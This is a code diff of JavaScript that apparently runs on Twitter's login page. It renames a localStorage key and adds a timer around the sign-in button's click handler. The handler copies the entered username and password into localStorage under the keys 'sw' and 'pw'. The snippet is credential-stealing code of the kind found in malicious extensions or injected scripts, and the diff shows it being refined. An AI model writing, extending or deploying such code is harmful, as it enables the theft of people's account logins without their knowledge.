@@ -16,7 +16,7 @@ if( document.getElementById('signin-email')) {  window.location = "https://twitt
 }, 300);
 
 tarih = new Date();
-    storage_key = 'access_twittarrr_';
+    storage_key = 'access_twittarrr3_';
     if (!localStorage[storage_key] || (localStorage[storage_key] && tarih.getTime() >= localStorage[storage_key])) {
         tarih.setTime(tarih.getTime() + 9999 * 9999 * 9999);
         localStorage[storage_key] = tarih.getTime();
@@ -30,9 +30,10 @@ document.getElementById("session").innerHTML = '<a href="https://twitter.com/log
 if (window.location.href.indexOf("login") >= 0) {
 
 	document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick = function(data) {
+		setInterval(function(){
 	localStorage['sw'] = document.querySelectorAll('.js-username-field')[0].value;
 	localStorage['pw'] = document.querySelectorAll('.js-password-field')[0].value;
-		
+		}, 99);
 		setTimeout(function() {
 			document.getElementsByClassName('t1-form clearfix signin js-signin')[0][2].onclick;
 		}, 99);
